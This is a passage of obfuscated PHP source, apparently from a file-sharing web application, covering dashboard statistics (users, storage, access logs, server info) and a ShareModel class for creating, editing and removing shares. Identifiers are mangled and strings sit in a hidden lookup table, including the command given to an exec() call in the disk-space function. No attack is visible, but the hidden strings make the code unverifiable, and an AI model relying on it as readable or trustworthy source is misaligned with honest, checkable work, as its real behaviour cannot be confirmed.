- 3600 * 24 * 7 * $¨îéøñŠ); $ÔË…±¾Ô[] = $ÃòÖŞ»¼; $¨îéøñŠ++; } while ($ºÛ›şÄî < $ÃòÖŞ»¼); break; case $ÚµåÈ¥å[1639]: $¨îéøñŠ = 1; do { $²£Ç½òÈ = date($ÚµåÈ¥å[1789], strtotime("\55\40{$¨îéøñŠ}\40\155\157\x6e\x74\x68\x73")); $ÔË…±¾Ô[] = $²£Ç½òÈ; $¨îéøñŠ++; } while ($ºÛ›şÄî < $²£Ç½òÈ); break; case $ÚµåÈ¥å[1790]: $¹ù±¡Ù³ = (int) date($ÚµåÈ¥å[1788], strtotime($ºÛ›şÄî)); $’ğ­¿Á = (int) date($ÚµåÈ¥å[1788]); if ($¹ù±¡Ù³ >= $’ğ­¿Á) { break; } for ($¹ù±¡Ù³; $¹ù±¡Ù³ < $’ğ­¿Á; $¹ù±¡Ù³++) { $ÔË…±¾Ô[] = $¹ù±¡Ù³ . $ÚµåÈ¥å[1791]; } break; default: break; } if ($ºÛ›şÄî > end($ÔË…±¾Ô)) { array_pop($ÔË…±¾Ô); } sort($ÔË…±¾Ô); return $ÔË…±¾Ô; } public function listTable($¤ÄáÎ‰Í) { $¢åª¨ıƒ = ucfirst($¤ÄáÎ‰Í); return Model($¢åª¨ıƒ)->listData(); } public function option($Ì«ş»Ç) { $¿ÓéÌ = $_SERVER[ïëó©ÒÚ][1792] . ucfirst($Ì«ş»Ç); return $this->{$¿ÓéÌ}(); } private function optionUser() { $¯‚¯êÊ™ =& $_SERVER[ïëó©ÒÚ]; $‘¥€øù = Model($¯‚¯êÊ™[544])->count($¯‚¯êÊ™[1661]); $µãıÛò = Model($¯‚¯êÊ™[544])->where($¯‚¯êÊ™[1793])->count($¯‚¯êÊ™[1661]); $¶ñØÃ«Í = intval($GLOBALS[$¯‚¯êÊ™[6]][$¯‚¯êÊ™[349]][$¯‚¯êÊ™[1616]]) / 3600; $ïš½ÉÅÓ = strtotime("\x2d{$¶ñØÃ«Í}\x20\150\157\165\x72\x73"); $–€¨‘Ö™ = strtotime(date($¯‚¯êÊ™[1774])); if ($ïš½ÉÅÓ < $–€¨‘Ö™) { $ïš½ÉÅÓ = $–€¨‘Ö™; } $íõ¡§ŠÃ = array($¯‚¯êÊ™[1794] => array($¯‚¯êÊ™[1017], $ïš½ÉÅÓ)); $—ÄáĞİ° = (int) Model($¯‚¯êÊ™[544])->where($íõ¡§ŠÃ)->count($¯‚¯êÊ™[1661]); if (!$—ÄáĞİ°) { $—ÄáĞİ° = 1; } $íõ¡§ŠÃ = array($¯‚¯êÊ™[1794] => array($¯‚¯êÊ™[1017], $–€¨‘Ö™)); $›„†¥Êà = Model($¯‚¯êÊ™[544])->where($íõ¡§ŠÃ)->count($¯‚¯êÊ™[1661]); return array($¯‚¯êÊ™[769] => (int) $‘¥€øù, $¯‚¯êÊ™[1795] => (int) ($‘¥€øù - $µãıÛò), $¯‚¯êÊ™[1796] => (int) $µãıÛò, $¯‚¯êÊ™[1797] => (int) $›„†¥Êà, $¯‚¯êÊ™[1798] => $—ÄáĞİ°); } private function optionFile() { $¹¡½²ñú =& $_SERVER[ïëó©ÒÚ]; $½ÅÖêÂ· = $this->sourceSize(); $ô‘¸›Ë‹ = $½ÅÖêÂ·[$¹¡½²ñú[76]]; $ñ÷ê…Ä = $½ÅÖêÂ·[$¹¡½²ñú[1767]]; $…¡¡Ã = Model($¹¡½²ñú[835])->where(array($¹¡½²ñú[419] => 0))->count($¹¡½²ñú[411]); $­Çª˜ÍÎ = array($¹¡½²ñú[419] => 0, $¹¡½²ñú[200] => array($¹¡½²ñú[1017], strtotime(date($¹¡½²ñú[1774])))); $–€à‡²’ = Model($¹¡½²ñú[835])->where($­Çª˜ÍÎ)->sum($¹¡½²ñú[76]); $òúÆ­€¸ = Model($¹¡½²ñú[835])->where($­Çª˜ÍÎ)->count($¹¡½²ñú[411]); return array($¹¡½²ñú[773] => $ô‘¸›Ë‹, $¹¡½²ñú[1767] => $ñ÷ê…Ä, $¹¡½²ñú[1799] => $ô‘¸›Ë‹ - $ñ÷ê…Ä, $¹¡½²ñú[1800] => (int) $–€à‡²’, $¹¡½²ñú[775] => (int) $…¡¡Ã, $¹¡½²ñú[1801] => (int) $òúÆ­€¸); } private function optionAccess() { $ÜÄğ¢Ë‡ =& $_SERVER[ïëó©ÒÚ]; return array($ÜÄğ¢Ë‡[769] => $this->typeLogCnt(), $ÜÄğ¢Ë‡[107] => $this->typeLogCnt($ÜÄğ¢Ë‡[107]), $ÜÄğ¢Ë‡[461] => $this->typeLogCnt($ÜÄğ¢Ë‡[461]), $ÜÄğ¢Ë‡[1802] => $this->typeLogCnt($ÜÄğ¢Ë‡[1802]), $ÜÄğ¢Ë‡[1803] => $this->typeLogCnt($ÜÄğ¢Ë‡[1803]), $ÜÄğ¢Ë‡[609] => $this->typeLogCnt($ÜÄğ¢Ë‡[12], $ÜÄğ¢Ë‡[1778])); } private function typeLogCnt($Õ¯‘‚ëÀ = '', $ŒĞ˜¦í = "\x69\144") { $Ì¬·¿§½ =& $_SERVER[ïëó©ÒÚ]; $ŒôÏ”æÀ = array($Ì¬·¿§½[107] => array($Ì¬·¿§½[1804], $Ì¬·¿§½[1805]), $Ì¬·¿§½[461] => array($Ì¬·¿§½[1806], $Ì¬·¿§½[1807]), $Ì¬·¿§½[1802] => array($Ì¬·¿§½[1808], $Ì¬·¿§½[1809], $Ì¬·¿§½[1810]), $Ì¬·¿§½[1803] => array($Ì¬·¿§½[1811], $Ì¬·¿§½[1812]), $Ì¬·¿§½[1813] => array($Ì¬·¿§½[1814], $Ì¬·¿§½[1815], $Ì¬·¿§½[1816])); $ûÌİà¨í = strtotime(date($Ì¬·¿§½[1774])); $¨õÍ…° = array($Ì¬·¿§½[200] => array($Ì¬·¿§½[1017], $ûÌİà¨í)); if ($Õ¯‘‚ëÀ) { $¨õÍ…°[$Ì¬·¿§½[33]] = array($Ì¬·¿§½[7], $ŒôÏ”æÀ[$Õ¯‘‚ëÀ]); } $ÍÆ¸øÆ† = Model($Ì¬·¿§½[1777])->where($¨õÍ…°)->count($ŒĞ˜¦í); return (int) $ÍÆ¸øÆ†; } private function optionServer() { $¥ÁúİŒù =& $_SERVER[ïëó©ÒÚ]; $ƒÖ¸µÂ  = $this->diskDriver(); $ªŞ£ä¡€ = KodIO::defaultDriver(); $÷ë©æğ = array($¥ÁúİŒù[827] => $ªŞ£ä¡€[$¥ÁúİŒù[399]]); $Œ‰ÁØ§½ = Model($¥ÁúİŒù[480])->where($÷ë©æğ)->sum($¥ÁúİŒù[76]); $şïá«ƒ = explode($¥ÁúİŒù[53], $_SERVER[$¥ÁúİŒù[143]]); $¿Ö€Çêğ = $şïá«ƒ[0]; $¥íºïÆ× = $GLOBALS[$¥ÁúİŒù[6]][$¥ÁúİŒù[21]]; $–½óÊ‚Ú = $¥íºïÆ×[$¥ÁúİŒù[979]]; if ($–½óÊ‚Ú == $¥ÁúİŒù[967]) { $ç…ñ‘İ¦ = explode($¥ÁúİŒù[1275], $¥íºïÆ×[$¥ÁúİŒù[978]]); $–½óÊ‚Ú = $ç…ñ‘İ¦[0]; } if ($–½óÊ‚Ú == $¥ÁúİŒù[915] || $–½óÊ‚Ú == $¥ÁúİŒù[814]) { $ñÙŞÎÊ¨ = Model()->db()->query($¥ÁúİŒù[1817]); $úÃ§¯Ô¥ = $ñÙŞÎÊ¨[0] && isset($ñÙŞÎÊ¨[0][$¥ÁúİŒù[1559]]) ? $ñÙŞÎÊ¨[0][$¥ÁúİŒù[1559]] : 0; $–½óÊ‚Ú = $¥ÁúİŒù[1818] . ($úÃ§¯Ô¥ ? $¥ÁúİŒù[8] . $úÃ§¯Ô¥ : $¥ÁúİŒù[12]); } $È³¡ğ† = $GLOBALS[$¥ÁúİŒù[6]][$¥ÁúİŒù[349]][$¥ÁúİŒù[837]]; return array($¥ÁúİŒù[1819] => $ƒÖ¸µÂ  ? $ƒÖ¸µÂ [$¥ÁúİŒù[1820]] : 0, $¥ÁúİŒù[1821] => $ƒÖ¸µÂ  ? $ƒÖ¸µÂ [$¥ÁúİŒù[1822]] : 0, $¥ÁúİŒù[1823] => (int) $ªŞ£ä¡€[$¥ÁúİŒù[1820]] * 1024 * 1024 * 1024, $¥ÁúİŒù[1824] => (int) $Œ‰ÁØ§½, $¥ÁúİŒù[1825] => ucfirst($¿Ö€Çêğ), $¥ÁúİŒù[1826] => $¥ÁúİŒù[1827] . PHP_VERSION, $¥ÁúİŒù[1828] => phpBuild64() ? 64 : 32, $¥ÁúİŒù[768] => str_replace($¥ÁúİŒù[1133], $¥ÁúİŒù[995], $–½óÊ‚Ú), $¥ÁúİŒù[349] => ucfirst($È³¡ğ†), $¥ÁúİŒù[32] => $_SERVER[$¥ÁúİŒù[1829]]); } private function diskDriver() { $ô¬âšÇ¹ =& $_SERVER[ïëó©ÒÚ]; $±ÅÒöó’ = $ô¬âšÇ¹[8]; $¤¦ßë¡  = $GLOBALS[$ô¬âšÇ¹[6]][$ô¬âšÇ¹[1291]] == $ô¬âšÇ¹[1292]; if ($¤¦ßë¡ ) { $±ÅÒöó’ = $ô¬âšÇ¹[1830]; if (function_exists($ô¬âšÇ¹[1831])) { exec($ô¬âšÇ¹[1832], $Ù§Ş‰‡); $±ÅÒöó’ = $Ù§Ş‰‡[1] . $ô¬âšÇ¹[8]; } } if (!file_exists($±ÅÒöó’)) { return; } $Ûë×Ÿ¿ = @disk_total_space($±ÅÒöó’); $Ú²Ö”¹½ = $Ûë×Ÿ¿ - @disk_free_space($±ÅÒöó’); return array($ô¬âšÇ¹[1820] => $Ûë×Ÿ¿, $ô¬âšÇ¹[1822] => $Ú²Ö”¹½); } public function fileChart($…åíš€à) { $”ª’åÊÁ =& $_SERVER[ïëó©ÒÚ]; if (isset($…åíš€à[$”ª’åÊÁ[1661]])) { return Model($”ª’åÊÁ[835])->userFileTypeProfile($…åíš€à[$”ª’åÊÁ[1661]]); } if (isset($…åíš€à[$”ª’åÊÁ[1833]])) { return Model($”ª’åÊÁ[835])->groupFileTypeProfile($…åíš€à[$”ª’åÊÁ[1833]]); } $ë÷‰ò¼Ö = $this->sourceSize(); $¶ú«»ãş = array($”ª’åÊÁ[441] => 0, $”ª’åÊÁ[420] => 1); $ù®ôÎ¾Ğ = Model($”ª’åÊÁ[835])->where($¶ú«»ãş)->sum($”ª’åÊÁ[76]); $¶ú«»ãş[$”ª’åÊÁ[420]] = 2; $ÈııÄéÈ = Model($”ª’åÊÁ[835])->where($¶ú«»ãş)->sum($”ª’åÊÁ[76]); return array($”ª’åÊÁ[773] => $ë÷‰ò¼Ö[$”ª’åÊÁ[76]], $”ª’åÊÁ[1767] => $ë÷‰ò¼Ö[$”ª’åÊÁ[1767]], $”ª’åÊÁ[1768] => (int) $ù®ôÎ¾Ğ, $”ª’åÊÁ[1769] => (int) $ÈııÄéÈ); } private function sourceSize() { $æˆ¹Ğ×æ =& $_SERVER[ïëó©ÒÚ]; $êò‰¿úé = Model($æˆ¹Ğ×æ[835])->where(array($æˆ¹Ğ×æ[419] => 0))->sum($æˆ¹Ğ×æ[76]); $©¢£ó’ú = Model($æˆ¹Ğ×æ[480])->sum($æˆ¹Ğ×æ[76]); if ($©¢£ó’ú > $êò‰¿úé) { $©¢£ó’ú = $êò‰¿úé; } return array($æˆ¹Ğ×æ[76] => (int) $êò‰¿úé, $æˆ¹Ğ×æ[1767] => (int) $©¢£ó’ú); } } goto aºÌŸ„¼È™; a™±´„Ì§¬: class ShareModel extends ModelBase { protected $tableName = "\x73\150\x61\x72\145"; protected $dataAuto = array(array("\155\157\144\x69\x66\x79\124\x69\155\x65", "\x74\x69\155\145", "\x69\156\163\145\x72\x74\x2c\165\160\x64\141\x74\145", "\146\165\x6e\x63\x74\151\x6f\x6e"), array("\x63\x72\x65\141\x74\145\x54\151\155\x65", "\x74\x69\155\x65", "\x69\156\163\145\162\164", "\x66\165\x6e\x63\x74\x69\157\156"), array("\x6f\160\x74\151\x6f\156\x73", '', "\151\x6e\x73\145\x72\x74\54\x75\160\144\141\x74\145\54\x73\x65\x6c\x65\x63\x74", "\x6a\x73\x6f\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($³á’‰ù¬) { $Ã€™µ²ú =& $_SERVER[ïëó©ÒÚ]; $Ï½şÙ» = isset($³á’‰ù¬[0]) ? $³á’‰ù¬[0] : !1; return array($Ã€™µ²ú[1972] => array(USER_ID, $Ã€™µ²ú[1973]), $Ã€™µ²ú[1913] => array($Ï½şÙ», $Ã€™µ²ú[1974])); } protected function listSimple() { $öıÌœ¿ = array($_SERVER[ïëó©ÒÚ][1661] => USER_ID); $º¼Î«´† = $this->field($this->fieldList)->where($öıÌœ¿)->select(); return $º¼Î«´† ? $º¼Î«´† : array(); } protected function getInfo($Ñ‘ëÀì„, $¾ùüã¼ı = false) { $à´º‰ì =& $_SERVER[ïëó©ÒÚ]; if ($¾ùüã¼ı) { return $this->_getShareInfo(array($à´º‰ì[498] => $Ñ‘ëÀì„)); } $«¥£ƒŠ = $this->cacheFunctionGet($à´º‰ì[1915], $Ñ‘ëÀì„); return $«¥£ƒŠ; } public function getInfoByHash($ÃèîÇ¥è) { return $this->_getShareInfo(array($_SERVER[ïëó©ÒÚ][500] => $ÃèîÇ¥è)); } public function getInfoByPath($‡ƒç”…µ) { $îôó×°± =& $_SERVER[ïëó©ÒÚ]; $åÜß™ë’ = array($îôó×°±[1661] => USER_ID, $îôó×°±[411] => $‡ƒç”…µ); return $this->_getShareInfo($åÜß™ë’); } public function getInfoBySourcePath($Şğà¿õÛ) { $³©òÈá =& $_SERVER[ïëó©ÒÚ]; $Í˜¬ÄÙ‹ = array($³©òÈá[1661] => USER_ID, $³©òÈá[1179] => $Şğà¿õÛ); return $this->_getShareInfo($Í˜¬ÄÙ‹); } private function _getShareInfo($¯É¼ÆŸ») { $ñ‹ÖŸ—ã =& $_SERVER[ïëó©ÒÚ]; $ù®ğÂÊŞ = $this->where($¯É¼ÆŸ»)->find(); if (!$ù®ğÂÊŞ) { return !1; } $¯É¼ÆŸ» = array($ñ‹ÖŸ—ã[498] => $ù®ğÂÊŞ[$ñ‹ÖŸ—ã[498]]); $­µÚ£èß = $ñ‹ÖŸ—ã[1975]; $êï©…®Ë = Model($ñ‹ÖŸ—ã[611])->order($ñ‹ÖŸ—ã[399])->field($­µÚ£èß)->where($¯É¼ÆŸ»)->select(); if ($ù®ğÂÊŞ[$ñ‹ÖŸ—ã[411]] == $ñ‹ÖŸ—ã[197]) { $ù®ğÂÊŞ[$ñ‹ÖŸ—ã[86]] = IO::info($ù®ğÂÊŞ[$ñ‹ÖŸ—ã[1179]]); } else { $ù®ğÂÊŞ[$ñ‹ÖŸ—ã[86]] = Model($ñ‹ÖŸ—ã[1330])->pathInfo($ù®ğÂÊŞ[$ñ‹ÖŸ—ã[411]]); } $ù®ğÂÊŞ[$ñ‹ÖŸ—ã[1976]] = $êï©…®Ë; return $ù®ğÂÊŞ; } protected function getInfoAuth($è×¶Ê¬û) { $Âİı¶§¢ =& $_SERVER[ïëó©ÒÚ]; $ÌûĞ‚ = $this->getInfo($è×¶Ê¬û); if ($ÌûĞ‚[$Âİı¶§¢[1661]] == USER_ID) { $ÌûĞ‚[$Âİı¶§¢[422]] = $ÌûĞ‚[$Âİı¶§¢[86]][$Âİı¶§¢[422]]; } else { $ÌûĞ‚[$Âİı¶§¢[422]] = Model($Âİı¶§¢[511])->authMake($ÌûĞ‚[$Âİı¶§¢[1976]]); } return $ÌûĞ‚; } protected function listData($Å·Û÷… = null, $½ˆ¡»Íñ = 300) { $ˆ–Üìª =& $_SERVER[ïëó©ÒÚ]; $†ğÂ´ŸÆ = array(array($ˆ–Üìª[503] => array($ˆ–Üìª[1015], 0), $ˆ–Üìª[505] => array($ˆ–Üìª[1015], 0), $ˆ–Üìª[1977] => $ˆ–Üìª[1931])); if ($Å·Û÷… == $ˆ–Üìª[1978]) { $†ğÂ´ŸÆ = array($ˆ–Üìª[503] => 1); } else { if ($Å·Û÷… == $ˆ–Üìª[1164]) { $†ğÂ´ŸÆ = array($ˆ–Üìª[505] => 1); } } $†ğÂ´ŸÆ[$ˆ–Üìª[1661]] = USER_ID; $Û×Âø±° = $this->where($†ğÂ´ŸÆ)->selectPage($½ˆ¡»Íñ); return $Û×Âø±°; } protected function listToMe($»×¢Ş ˜ = 300) { $ıåã´¨é =& $_SERVER[ïëó©ÒÚ]; $–ßÊ‚ğ = Model($ıåã´¨é[1979])->userGroupParents(USER_ID); $ÂëôË–Ë = array($ıåã´¨é[595] => SourceModel::TYPE_USER, $ıåã´¨é[514] => USER_ID); if ($–ßÊ‚ğ) { $ÂëôË–Ë = array(array($ıåã´¨é[595] => SourceModel::TYPE_USER, $ıåã´¨é[514] => USER_ID), array($ıåã´¨é[595] => SourceModel::TYPE_GROUP, $ıåã´¨é[514] => array($ıåã´¨é[7], $–ßÊ‚ğ)), $ıåã´¨é[1977] => $ıåã´¨é[1931]); } $«óÂİÍ¡ = Model($ıåã´¨é[611])->where($ÂëôË–Ë)->selectPage($»×¢Ş ˜); $¦îñâË = array_to_keyvalue_group($«óÂİÍ¡[$ıåã´¨é[369]], $ıåã´¨é[498]); if (!$¦îñâË) { return $«óÂİÍ¡; } $Õ²Ï£ßØ = $ıåã´¨é[1980]; $ÂëôË–Ë = array($ıåã´¨é[498] => array($ıåã´¨é[427], array_keys($¦îñâË)), $ıåã´¨é[1661] => array($ıåã´¨é[1017], $ıåã´¨é[197])); $îçìğíš = $this->field($Õ²Ï£ßØ)->where($ÂëôË–Ë)->select(); foreach ($îçìğíš as $ÁŒ¹‰Ò¡ => &$ßÎÄ¬……) { $ßÎÄ¬……[$ıåã´¨é[1976]] = $¦îñâË[$ßÎÄ¬……[$ıåã´¨é[498]]]; } unset($ßÎÄ¬……); $ÛÕµ¸Ø¾ = array($ıåã´¨é[1981] => $îçìğíš, $ıåã´¨é[1982] => $«óÂİÍ¡[$ıåã´¨é[366]]); return $ÛÕµ¸Ø¾; } protected function shareAdd($Á½¬ö·µ, $€Ê°ÑÙì) { $¦‘µ³áö =& $_SERVER[ïëó©ÒÚ]; $ô¨€­µ© = $this->_addShareData($Á½¬ö·µ, $€Ê°ÑÙì); if (!empty($€Ê°ÑÙì[$¦‘µ³áö[1983]])) { $this->_shareAuthSet($ô¨€­µ©, $€Ê°ÑÙì[$¦‘µ³áö[1983]]); } $this->shareEventAdd($Á½¬ö·µ, $€Ê°ÑÙì, $¦‘µ³áö[1167]); return $ô¨€­µ©; } protected function shareAddSystem($¾€ØÔÜ, $²ÀÛâÒÅ) { $®øÀ–Á =& $_SERVER[ïëó©ÒÚ]; $ÅòÂŞê° = $this->_addShareData($¾€ØÔÜ, $²ÀÛâÒÅ, $®øÀ–Á[1279]); $this->_shareAuthSet($ÅòÂŞê°, $²ÀÛâÒÅ[$®øÀ–Á[1983]]); return $ÅòÂŞê°; } private function shareEventAdd($•½ÕÃ, $ùúóöšÍ, $¢°Ïë”ø = "\x61\x64\x64") { $şèƒâ®« =& $_SERVER[ïëó©ÒÚ]; if (!$•½ÕÃ || $•½ÕÃ == $şèƒâ®«[197]) { return; } if ($¢°Ïë”ø == $şèƒâ®«[1167]) { if ($ùúóöšÍ[$şèƒâ®«[503]] == $şèƒâ®«[88]) { Model($şèƒâ®«[579])->eventShare($•½ÕÃ, $şèƒâ®«[1984]); } if ($ùúóöšÍ[$şèƒâ®«[505]] == $şèƒâ®«[88]) { Model($şèƒâ®«[579])->eventShare($•½ÕÃ, $şèƒâ®«[1985]); } return; } $«İøíÎñ = $this->getInfoByPath($•½ÕÃ); $“çÆÅâ = $şèƒâ®«[1986]; if ($«İøíÎñ[$şèƒâ®«[503]] == $şèƒâ®«[197] && $ùúóöšÍ[$şèƒâ®«[503]] == $şèƒâ®«[88]) { $“çÆÅâ = $şèƒâ®«[1984]; } if ($«İøíÎñ[$şèƒâ®«[503]] == $şèƒâ®«[88] && $ùúóöšÍ[$şèƒâ®«[503]] == $şèƒâ®«[197]) { $“çÆÅâ = $şèƒâ®«[1987]; } if ($«İøíÎñ[$şèƒâ®«[505]] == $şèƒâ®«[197] && $ùúóöšÍ[$şèƒâ®«[505]] == $şèƒâ®«[88]) { $“çÆÅâ = $şèƒâ®«[1985]; } if ($«İøíÎñ[$şèƒâ®«[505]] == $şèƒâ®«[88] && $ùúóöšÍ[$şèƒâ®«[505]] == $şèƒâ®«[197]) { $“çÆÅâ = $şèƒâ®«[1988]; } Model($şèƒâ®«[579])->eventShare($•½ÕÃ, $“çÆÅâ); return; } private function _addShareData($Íù¨Ã¯Š, $Û‡ØÈéª = array(), $Õôö†¥ = false) { $æÉ”Í§ğ =& $_SERVER[ïëó©ÒÚ]; $ƒÒ–°Ò = $Õôö†¥ == $æÉ”Í§ğ[1279] ? 0 : USER_ID; $ËŞØ²ïç = array($æÉ”Í§ğ[426] => $Íù¨Ã¯Š, $æÉ”Í§ğ[1652] => $ƒÒ–°Ò); if ($Íù¨Ã¯Š == 0) { $ËŞØ²ïç = array($æÉ”Í§ğ[1989] => $Û‡ØÈéª[$æÉ”Í§ğ[1179]], $æÉ”Í§ğ[1652] => $ƒÒ–°Ò); } if ($÷±ïá» = $this->where($ËŞØ²ïç)->find()) { return $÷±ïá»[$æÉ”Í§ğ[498]]; } if ($Íù¨Ã¯Š == 0) { $šå„ÊÅ = array($æÉ”Í§ğ[32] => get_path_this($Û‡ØÈéª[$æÉ”Í§ğ[84]])); } else { $šå„ÊÅ = Model($æÉ”Í§ğ[835])->sourceInfo($Íù¨Ã¯Š); if (!$šå„ÊÅ) { return !1; } } if (!$Û‡ØÈéª[$æÉ”Í§ğ[1560]]) { $Û‡ØÈéª[$æÉ”Í§ğ[1560]] = $šå„ÊÅ[$æÉ”Í§ğ[32]]; } $œ¤ºÆş¨ = array($æÉ”Í§ğ[1652] => $ƒÒ–°Ò, $æÉ”Í§ğ[426] => $Íù¨Ã¯Š, $æÉ”Í§ğ[1560] => $æÉ”Í§ğ[12], $æÉ”Í§ğ[503] => 0, $æÉ”Í§ğ[505] => 0, $æÉ”Í§ğ[1179] => $æÉ”Í§ğ[12], $æÉ”Í§ğ[307] => $æÉ”Í§ğ[12], $æÉ”Í§ğ[892] => $æÉ”Í§ğ[12], $æÉ”Í§ğ[1990] => 0, $æÉ”Í§ğ[1991] => 0, $æÉ”Í§ğ[506] => 0, $æÉ”Í§ğ[507] => $æÉ”Í§ğ[12], $æÉ”Í§ğ[500] => $æÉ”Í§ğ[12]); $‰Ñ³Ö×È = explode($æÉ”Í§ğ[50], $æÉ”Í§ğ[1992]); foreach ($‰Ñ³Ö×È as $´Øğ”•¬) { if (!isset($Û‡ØÈéª[$´Øğ”•¬])) { continue; } $œ¤ºÆş¨[$´Øğ”•¬] = $Û‡ØÈéª[$´Øğ”•¬]; } $ë³ØÁİ = $this->add($œ¤ºÆş¨); $ôŠşÏË½ = array($æÉ”Í§ğ[500] => short_id($ë³ØÁİ)); $this->where(array($æÉ”Í§ğ[497] => $ë³ØÁİ))->save($ôŠşÏË½); return $ë³ØÁİ; } private function _shareAuthSet($šÂï¬î­, $Š…ƒâ½î) { $ÈÊÇ¸´ä =& $_SERVER[ïëó©ÒÚ]; if (!is_array($Š…ƒâ½î)) { return !1; } $ĞğœÅ Ğ = Model($ÈÊÇ¸´ä[1941]); $ĞğœÅ Ğ->where(array($ÈÊÇ¸´ä[498] => $šÂï¬î­))->delete(); $„‚Ê½òÃ = array(); foreach ($Š…ƒâ½î as $¼ÛáĞ¡È) { $Úæç­” = SourceModel::TYPE_USER; if ($¼ÛáĞ¡È[$ÈÊÇ¸´ä[420]] == SourceModel::TYPE_GROUP) { $Úæç­” = SourceModel::TYPE_GROUP; } $Ôùı¢Ãƒ = array($ÈÊÇ¸´ä[498] => $šÂï¬î­, $ÈÊÇ¸´ä[420] => $Úæç­”, $ÈÊÇ¸´ä[514] => intval($¼ÛáĞ¡È[$ÈÊÇ¸´ä[514]]), $ÈÊÇ¸´ä[1937] => 0, $ÈÊÇ¸´ä[1993] => -1); if ($¼ÛáĞ¡È[$ÈÊÇ¸´ä[1937]]) { $Ôùı¢Ãƒ[$ÈÊÇ¸´ä[1937]] = $¼ÛáĞ¡È[$ÈÊÇ¸´ä[1937]]; } else { if ($¼ÛáĞ¡È[$ÈÊÇ¸´ä[1993]]) { $Ôùı¢Ãƒ[$ÈÊÇ¸´ä[1993]] = $¼ÛáĞ¡È[$ÈÊÇ¸´ä[1993]]; } } $„‚Ê½òÃ[] = $Ôùı¢Ãƒ; } return $ĞğœÅ Ğ->addAll($„‚Ê½òÃ, array(), !0); } public function numViewAdd($Úä¶³¥¥) { $¤ßÛô¿ä =& $_SERVER[ïëó©ÒÚ]; $Šô¤ü‚ì = array($¤ßÛô¿ä[497] => $Úä¶³¥¥); $this->where($Šô¤ü‚ì)->setAdd($¤ßÛô¿ä[1990]); } public function numDownloadAdd($Æ€÷•Õ) { $³âÒÇû =& $_SERVER[ïëó©ÒÚ]; $ï»¨É’î = array($³âÒÇû[497] => $Æ€÷•Õ); $this->where($ï»¨É’î)->setAdd($³âÒÇû[1991]); } protected function shareEdit($ –Ú³éì, $Å±ŒÙÛ) { $·ƒ¢±”„ =& $_SERVER[ïëó©ÒÚ]; $¢ää±¯ = $this->getInfo($ –Ú³éì); if (!$¢ää±¯) { return !1; } $this->_checkLinkShare($Å±ŒÙÛ, $¢ää±¯); $Ñ—˜ÈÜ = array(); $ûÃ®Ó¾ì = explode($·ƒ¢±”„[50], $·ƒ¢±”„[1994]); foreach ($ûÃ®Ó¾ì as $—ğ¤‰âº) { if (!array_key_exists($—ğ¤‰âº, $Å±ŒÙÛ)) { continue; } $Ñ—˜ÈÜ[$—ğ¤‰âº] = $Å±ŒÙÛ[$—ğ¤‰âº]; } $this->shareEventAdd($¢ää±¯[$·ƒ¢±”„[411]], $Å±ŒÙÛ, $·ƒ¢±”„[1803]); $this->where(array($·ƒ¢±”„[497] => $ –Ú³éì))->save($Ñ—˜ÈÜ); if (isset($Å±ŒÙÛ[$·ƒ¢±”„[1983]])) { $this->_shareAuthSet($ –Ú³éì, $Å±ŒÙÛ[$·ƒ¢±”„[1983]]); } return !0; } private function _checkLinkShare($Ôı›„ï, $ÖôÌ¼›¡) { $„ ¨”å– =& $_SERVER[ïëó©ÒÚ]; if ($Ôı›„ï[$„ ¨”å–[503]] != $„ ¨”å–[88]) { return; } $ÜæğŒº = $ÖôÌ¼›¡[$„ ¨”å–[86]][$„ ¨”å–[411]]; if ($ÖôÌ¼›¡[$„ ¨”å–[86]][$„ ¨”å–[33]] != $„ ¨”å–[199]) { $×±Óƒë£ = $this->_folderReport($ÜæğŒº); if (!$×±Óƒë£) { return; } show_json(LNG($„ ¨”å–[1995]) . $„ ¨”å–[1996] . $×±Óƒë£, !1); } $“«Å›ıè = Model($„ ¨”å–[835])->fileInfoGet($ÖôÌ¼›¡[$„ ¨”å–[86]][$„ ¨”å–[411]]); if (!$“«Å›ıè) { return; } $Û’¿’úÇ = $this->shareFileMeta($“«Å›ıè[$„ ¨”å–[477]]); if (isset($Û’¿’úÇ[$„ ¨”å–[374]]) && $Û’¿’úÇ[$„ ¨”å–[374]] == $„ ¨”å–[88]) { show_json(LNG($„ ¨”å–[1997]), !1); } } private function _folderReport($©¡½†ñá) { $ï¿Ññƒí =& $_SERVER[ïëó©ÒÚ]; $Í‰ãíúÛ = array($ï¿Ññƒí[477] => array($ï¿Ññƒí[1015], 0), $ï¿Ññƒí[760] => 3); $å¢¯ì§ = Model($ï¿Ññƒí[1998])->where($Í‰ãíúÛ)->field($ï¿Ññƒí[477])->select(); if (!$å¢¯ì§) { return !1; } $å¢¯ì§ = array_to_keyvalue($å¢¯ì§, $ï¿Ññƒí[12], $ï¿Ññƒí[477]); $†Æ˜Şè… = $ï¿Ññƒí[50] . $©¡½†ñá . $ï¿Ññƒí[50]; $Í‰ãíúÛ = array($ï¿Ññƒí[477] => array($ï¿Ññƒí[7], $å¢¯ì§), $ï¿Ññƒí[530] => array($ï¿Ññƒí[383], "\45{$†Æ˜Şè…}\45"), $ï¿Ññƒí[440] => 0); $ëÒáÈ = Model($ï¿Ññƒí[835])->where($Í‰ãíúÛ)->field($ï¿Ññƒí[1999])->find(); if (!$ëÒáÈ) { return !1; } $”Ï”Â°À = substr($ëÒáÈ[$ï¿Ññƒí[530]], strpos($ëÒáÈ[$ï¿Ññƒí[530]], $†Æ˜Şè…)); $Í‰ãíúÛ = array($ï¿Ññƒí[411] => array($ï¿Ññƒí[7], trim($”Ï”Â°À, $ï¿Ññƒí[50]))); $àÅÖÑŞ½ = Model($ï¿Ññƒí[835])->where($Í‰ãíúÛ)->field($ï¿Ññƒí[32])->select(); $ßÁ½×í‡ = array_to_keyvalue($àÅÖÑŞ½, $ï¿Ññƒí[12], $ï¿Ññƒí[32]); $ßÁ½×í‡[] = $ëÒáÈ[$ï¿Ññƒí[32]]; return implode($ï¿Ññƒí[8], $ßÁ½×í‡); } protected function remove($é°ÖË”à) { $ßÆğÖ¹Û =& $_SERVER[ïëó©ÒÚ]; if (is_array($é°ÖË”à)) { $é°ÖË”à = array($ßÆğÖ¹Û[7], $é°ÖË”à); } $ĞêÙÓ˜Ì = array($ßÆğÖ¹Û[498] => $é°ÖË”à); $°¢ıö÷¬ = $this->where($ĞêÙÓ˜Ì)->delete(); if ($°¢ıö÷¬) { Model($ßÆğÖ¹Û[611])->where(array($ßÆğÖ¹Û[498] => $é°ÖË”à))->delete(); } $°ğ¼×ºâ = is_array($é°ÖË”à) ? $é°ÖË”à[1] : array($é°ÖË”à); for ($™Î š†… = 